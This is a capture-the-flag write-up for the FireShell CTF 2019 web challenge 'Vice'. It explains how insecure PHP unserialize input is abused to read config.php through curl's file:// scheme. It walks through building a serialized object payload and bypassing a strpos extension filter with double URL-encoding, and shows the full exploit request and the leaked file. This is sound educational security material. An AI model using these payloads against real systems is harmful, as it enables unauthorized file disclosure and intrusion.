# FireShell CTF 2019 – Vice

* **Category:** web
* **Points:** 269

## Challenge

> [http://68.183.31.62:991/](http://68.183.31.62:991/)

## Solution

The challenge will give you a PHP script.

```php
<?php
//require_once 'config.php';

class SHITS{
  private $url;
  private $method;
  private $addr;
  private $host;
  private $name;

  function __construct($method,$url){
    $this->method = $method;
    $this->url = $url;
  }

  function doit(){
    
    $this->host = @parse_url($this->url)['host'];
    $this->addr = @gethostbyname($this->host);
    $this->name = @gethostbyaddr($this->host);
    if($this->addr !== "127.0.0.1" || $this->name === false){
      $not = ['.txt','.php','.xml','.html','.','[',']'];
      foreach($not as $ext){
        $p = strpos($this->url,$ext);
        if($p){
          die(":)");
        }
      }
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$this->url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

      $result = curl_exec($ch);
      echo $result;
    }else{
      die(":)");
    }
  }
  function __destruct(){
    if(in_array($this->method,array("doit"))){
 
      call_user_func_array(array($this,$this->method),array());
    }else{
      die(":)");
    }
  }
}
if(isset($_GET["gg"])) {
    @unserialize($_GET["gg"]);
} else {
    highlight_file(__FILE__);
}
```

The flag is probably stored into `config.php` file, hence it must be printed via the *curl* execution.

To perform this, the `doit` method must be executed. That method is invoked into `__destruct()` function if present in the `$method` attribute of the destructed object.

The `unserialize` method must be abused to craft an object with desired parameters.

To serialize an object that can be used for the exploit, the following script can be executed.

```php
class SHITS{
  private $url;
  private $method;
  private $addr;
  private $host;
  private $name;
}

print serialize(new SHITS);
```

It will print the following.

```
O:5:"SHITS":5:{s:10:"SHITSurl";N;s:13:"SHITSmethod";N;s:11:"SHITSaddr";N;s:11:"SHITShost";N;s:11:"SHITSname";N;}
```

Now you have to customize the script in order to exploit the challenge.

First of all, the `$method` attribute must be set to `doit`.

```php
class SHITS{
  private $url;
  private $method = "doit";
  private $addr;
  private $host;
  private $name;
}

print serialize(new SHITS);
```

The next attribute to set is `$url`. Analyzing the script, you can discover the presence of a check on localhost address. To bypass this check, the URL could be crafted based on the default path for web sites on Apache servers: `file:///var/www/html/config.php`.

```php
class SHITS{
  private $url = "file:///var/www/html/config.php";
  private $method = "doit";
  private $addr;
  private $host;
  private $name;
}

print serialize(new SHITS);
```

At this point, another check present in the script must be bypassed. The second checks is referred to the file extension; in particular, the extension `.php` will be blocked.

Luckily, the check is performed via `strpos` and there is a well-known strange behavior, based on which double URL-encoded chars are not considered by `strpos` but are considered valid by *curl* ([https://bugs.php.net/bug.php?id=76671&edit=1](https://bugs.php.net/bug.php?id=76671&edit=1)). So it is sufficient to replace the `.` char with `%252e`.

```php
class SHITS{
  private $url = "file:///var/www/html/config.php";
  private $method = "doit";
  private $addr;
  private $host;
  private $name;
}

print str_replace(".", "%252e", serialize(new SHITS));
```

The produced payload will be the following.

```
O:5:"SHITS":5:{s:10:"SHITSurl";s:31:"file:///var/www/html/config%252ephp";s:13:"SHITSmethod";s:4:"doit";s:11:"SHITSaddr";N;s:11:"SHITShost";N;s:11:"SHITSname";N;} 
```

After this operation the payload must be modified according to the `str_replace`.

The string `file:///var/www/html/config.php` is composed by 31 chars, with the replace operation it will become `file:///var/www/html/config%252ephp`; the GET operation performed server side will automatically perform a URL decode translating `%25` to `%`, hence the string will be `file:///var/www/html/config%2ephp` composed by 33 chars.

The length of the string into the payload must be updated accordingly.

```
O:5:"SHITS":5:{s:10:"SHITSurl";s:33:"file:///var/www/html/config%252ephp";s:13:"SHITSmethod";s:4:"doit";s:11:"SHITSaddr";N;s:11:"SHITShost";N;s:11:"SHITSname";N;}
```

At this point, the payload can be URL-encoded with the following script (don't forget to update the length of the URL string).

```php
class SHITS{
  private $url = "file:///var/www/html/config.php";
  private $method = "doit";
  private $addr;
  private $host;
  private $name;
}

print str_replace(".", "%252e", urlencode(serialize(new SHITS)));
```

The payload will be the following.

```
O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D
```

The GET request and response will be the following.

```
GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D HTTP/1.1
Host: 68.183.31.62:991
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ugifl5ke3p183slvcbcs6r5054
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Sun, 27 Jan 2019 16:19:07 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Vary: Accept-Encoding
Content-Length: 137
Connection: close
Content-Type: text/html

<?php
if($_SERVER['REMOTE_ADDR'] !== '::1' || $_SERVER['REMOTE_ADDR'] !== '127.0.0.1'){
echo "aaawn";
}else{
$flag ="F#{wtf_5trp0s_}";
}
```

The flag is the following.

```
F#{wtf_5trp0s_}
```